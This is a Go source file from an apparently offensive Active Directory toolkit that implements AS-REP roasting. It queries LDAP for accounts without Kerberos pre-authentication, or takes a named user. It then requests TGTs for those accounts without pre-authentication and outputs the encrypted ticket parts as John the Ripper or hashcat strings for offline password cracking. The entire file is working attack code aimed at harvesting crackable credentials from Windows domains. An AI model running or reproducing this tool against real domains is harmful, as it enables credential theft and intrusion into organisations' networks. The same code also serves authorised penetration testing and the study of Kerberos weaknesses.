package kerberos

import (
	"fmt"
	"github.com/go-ldap/ldap/v3"
	"github.com/vincd/savoir/modules/paquet/krb5"
	"github.com/vincd/savoir/modules/paquet/krb5/crypto"
	"tdk/conf"
	"tdk/process"
)

func AsrepRoast(l **ldap.Conn, domain string, dcIp string, targetUser string, format string, enctype string, outputFile string, ldapSizeLimit int) error {
	var socks string

	//判断参数
	if err := conf.ValidateFormatFlag(format); err != nil {
		return err
	}

	if err := conf.ValidateETypeFlag(enctype); err != nil {
		return err
	}

	conf.PrintDomainInformation(domain, dcIp)

	//判断代理 目前不用
	dialer, err := conf.GetKdcDialer(socks)
	if err != nil {
		return fmt.Errorf("Cannot create SOCKS client: %s", err)
	}

	encType := conf.GetETypeFromFlagValue(enctype)
	hashes := ""
	targets := make([]string, 0)
	if len(targetUser) > 0 {
		targets = append(targets, targetUser)
	} else {
		fmt.Printf("[*] Use LDAP to retreive vulnerable accounts\n")
		SearchRoast := ldap.NewSearchRequest(
			KosListDomain,
			ldap.ScopeWholeSubtree,
			ldap.NeverDerefAliases,
			ldapSizeLimit,
			0,
			false,
			conf.Ldap_queries["asreproast"],
			[]string{"sAMAccountName"},
			nil)
		roastUser, err := (*l).Search(SearchRoast)
		if err != nil {
			fmt.Println(err)
		}
		for _, entry := range roastUser.Entries {
			targets = append(targets, entry.GetAttributeValue("sAMAccountName"))
		}
	}

	for _, target := range targets {
		fmt.Printf("[*] Ask AS-Rep for user %s without pre-authentication\n", target)

		tgt, err := krb5.AskTGT(dialer, domain, target, "", nil, encType, dcIp, true, false)

		if err != nil {
			fmt.Printf("[!] An error occured: %s\n", err)
			continue
		}

		fmt.Printf("[*] Get a valid ticket with encryption: %s\n", crypto.ETypeToString(tgt.EncPart.EType))

		if format == "john" {
			hashes += fmt.Sprintf("%s\n", tgt.JohnString())
		} else if format == "hashcat" {
			hashes += fmt.Sprintf("%s\n", tgt.HashcatString())
		}
	}

	if len(hashes) == 0 {
		fmt.Printf("[!] We found 0 hash...\n")
		return nil
	}

	if len(outputFile) == 0 {
		fmt.Printf("[*] Hashes:\n%s\n", hashes)
	} else {
		err = process.OutFileRoast(hashes, outputFile)
		if err != nil {
			return err
		}
	}

	return nil
}
